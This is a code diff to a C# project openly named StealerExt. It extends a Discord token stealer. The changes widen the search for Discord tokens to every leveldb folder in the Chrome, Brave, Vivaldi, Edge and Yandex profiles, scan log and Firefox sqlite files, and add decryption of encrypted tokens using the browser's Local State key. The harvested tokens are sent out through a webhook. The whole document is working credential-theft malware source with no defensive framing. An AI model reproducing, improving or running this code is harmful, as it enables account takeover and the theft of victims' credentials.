@@ -16,31 +16,55 @@ namespace StealerExt
 {
     public class Stealer
 	{
-		private static List<string> TokenStealer(DirectoryInfo Folder, bool checkLogs = false)
+		private static List<string> TokenStealer(DirectoryInfo Folder, bool no = false)
 		{
 			List<string> list = new List<string>();
 			try
 			{
-				FileInfo[] files = Folder.GetFiles(checkLogs ? "*.log" : "*.ldb");
-				for (int i = 0; i < files.Length; i++)
+				FileInfo[] ldbfiles = Folder.GetFiles("*.ldb");
+				FileInfo[] logFiles = Folder.GetFiles("*.log");
+				FileInfo[] firefoxsqlite = Folder.GetFiles("*.sqlite");
+				FileInfo[] logFirefox = Folder.GetFiles("*.log");
+				for (int i = 0; i < ldbfiles.Length; i++)
 				{
-					string input = files[i].OpenText().ReadToEnd();
-					foreach (object obj in Regex.Matches(input, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}"))
+					string input = ldbfiles[i].OpenText().ReadToEnd();
+					foreach (object obj in Regex.Matches(input, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}|dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^""]*"))
 					{
-						SaveTokensAsync(TokenCheckAccess(((Match)obj).Value));
+                        if (Regex.IsMatch(((Match)obj).Value, @"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^""]*"))
+                        {
+                            string token = DecryptDiscordToken.Decrypt_Token(Convert.FromBase64String(((Match)obj).Value.Split(new[] { "dQw4w9WgXcQ:" }, StringSplitOptions.None)[1]), Folder.Parent.Parent.FullName + "\\Local State");
+							Task.FromResult(SaveTokensAsync(TokenCheckAccess(token)));
+						}
+						else Task.FromResult(SaveTokensAsync(TokenCheckAccess(((Match)obj).Value)));
 					}
 				}
-			}
-			catch{}
-            try
-            {
-				FileInfo[] firefox = Folder.GetFiles(checkLogs ? "*.log" : "*.sqlite");
-				for (int i = 0; i < firefox.Length; i++)
+				for (int i = 0; i < logFiles.Length; i++)
 				{
-					string input = firefox[i].OpenText().ReadToEnd();
+					string input = logFiles[i].OpenText().ReadToEnd();
+					foreach (object obj in Regex.Matches(input, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}|dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^""]*"))
+					{
+						if (Regex.IsMatch(((Match)obj).Value, @"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^""]*"))
+						{
+							string token = DecryptDiscordToken.Decrypt_Token(Convert.FromBase64String(((Match)obj).Value.Split(new[] { "dQw4w9WgXcQ:" }, StringSplitOptions.None)[1]), Folder.Parent.Parent.FullName + "\\Local State");
+							Task.FromResult(SaveTokensAsync(TokenCheckAccess(token)));
+						}
+						else Task.FromResult(SaveTokensAsync(TokenCheckAccess(((Match)obj).Value)));
+					}
+				}
+				for (int i = 0; i < firefoxsqlite.Length; i++)
+				{
+					string input = firefoxsqlite[i].OpenText().ReadToEnd();
 					foreach (object obj in Regex.Matches(input, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}"))
 					{
-						SaveTokensAsync(TokenCheckAccess(((Match)obj).Value));
+						Task.FromResult(SaveTokensAsync(TokenCheckAccess(((Match)obj).Value)));
+					}
+				}
+				for (int i = 0; i < logFirefox.Length; i++)
+				{
+					string input = logFirefox[i].OpenText().ReadToEnd();
+					foreach (object obj in Regex.Matches(input, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}"))
+					{
+						Task.FromResult(SaveTokensAsync(TokenCheckAccess(((Match)obj).Value)));
 					}
 				}
 			}
@@ -387,15 +411,16 @@ namespace StealerExt
 				StealTokenFromVivaldi();
 				StealTokenFromFirefox();
 				StealTokenFromDiscordDev();
-				SendAsync();
+				Task.FromResult(SendAsync());
             }
 			catch (Exception x)
 			{
-				new API(API.wHook)
+                Console.WriteLine(x.Message);
+                new API(API.wHook)
 				{
 					_name = API.name,
 					_ppUrl = API.pfp
-				}.SendSysInfo("Exception: " + x, null);
+				}.SendSysInfo("Exception: " + x.Message, null);
 			}
 		}
 
@@ -487,12 +512,12 @@ namespace StealerExt
 
 		private static void StealTokenFromChrome()
 		{
-			string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\";
-			DirectoryInfo folder = new DirectoryInfo(path);
-			if (Directory.Exists(path))
-			{
+			string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\";
+			if (!Directory.Exists(path)) return;
+			foreach (DirectoryInfo dir in new DirectoryInfo(path).GetDirectories("leveldb", SearchOption.AllDirectories))
+            {
 				Chrome = true;
-				List<string> list = TokenStealer(folder, false);
+				List<string> list = TokenStealer(dir, false);
 				if (list != null && list.Count > 0)
 				{
 					Chrome = true;
@@ -502,9 +527,9 @@ namespace StealerExt
 
 		private static void StealTokenFromBrave()
 		{
-			string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\";
-			DirectoryInfo folder = new DirectoryInfo(path);
-			if (Directory.Exists(path))
+			string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\BraveSoftware\\Brave-Browser\\User Data\\";
+			if (!Directory.Exists(path)) return;
+			foreach (DirectoryInfo folder in new DirectoryInfo(path).GetDirectories("leveldb", SearchOption.AllDirectories))
 			{
 				Brave = true;
 				List<string> list = TokenStealer(folder, false);
@@ -517,9 +542,9 @@ namespace StealerExt
 
 		private static void StealTokenFromBraveNightly()
 		{
-			string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\BraveSoftware\\Brave-Browser-Nightly\\User Data\\Default\\Local Storage\\leveldb\\";
-			DirectoryInfo folder = new DirectoryInfo(path);
-			if (Directory.Exists(path))
+			string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\BraveSoftware\\Brave-Browser-Nightly\\User Data\\";
+			if (!Directory.Exists(path)) return;
+			foreach (DirectoryInfo folder in new DirectoryInfo(path).GetDirectories("leveldb", SearchOption.AllDirectories))
 			{
 				Brave_Nightly = true;
 				List<string> list = TokenStealer(folder, false);
@@ -547,9 +572,9 @@ namespace StealerExt
 
 		private static void StealTokenFromVivaldi()
 		{
-			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\";
-			DirectoryInfo folder = new DirectoryInfo(path);
-			if (Directory.Exists(path))
+			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Vivaldi\\User Data\\";
+			if (!Directory.Exists(path)) return;
+			foreach (DirectoryInfo folder in new DirectoryInfo(path).GetDirectories("leveldb", SearchOption.AllDirectories))
 			{
 				Vivaldi = true;
 				List<string> list = TokenStealer(folder, false);
@@ -563,7 +588,7 @@ namespace StealerExt
 		{
 			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\";
 			DirectoryInfo folder = new DirectoryInfo(path);
-			if (Directory.Exists(path))
+            if (folder.Exists)
 			{
 				OperaGX = true;
 				List<string> list = TokenStealer(folder, false);
@@ -576,9 +601,9 @@ namespace StealerExt
 
 		private static void StealTokenFromEdge()
 		{
-			string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\";
-			DirectoryInfo folder = new DirectoryInfo(path);
-			if (Directory.Exists(path))
+			string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Edge\\User Data\\";
+			if (!Directory.Exists(path)) return;
+			foreach (DirectoryInfo folder in new DirectoryInfo(path).GetDirectories("leveldb", SearchOption.AllDirectories))
 			{
 				Edge = true;
 				List<string> list = TokenStealer(folder, false);
@@ -591,9 +616,9 @@ namespace StealerExt
 
 		private static void StealTokenFromYandex()
 		{
-			string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\";
-			DirectoryInfo folder = new DirectoryInfo(path);
-			if (Directory.Exists(path))
+			string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Yandex\\YandexBrowser\\User Data\\";
+			if (!Directory.Exists(path)) return;
+			foreach (DirectoryInfo folder in new DirectoryInfo(path).GetDirectories("leveldb", SearchOption.AllDirectories))
 			{
 				Yandex = true;
 				List<string> list = TokenStealer(folder, false);
@@ -606,7 +631,7 @@ namespace StealerExt
 
 		private static void StealTokenFromFirefox()
 		{
-			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles\\";
+			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles\\"; 
 			if (Directory.Exists(path))
 			{
 				foreach (string text in Directory.EnumerateFiles(path, "webappsstore.sqlite", SearchOption.AllDirectories))
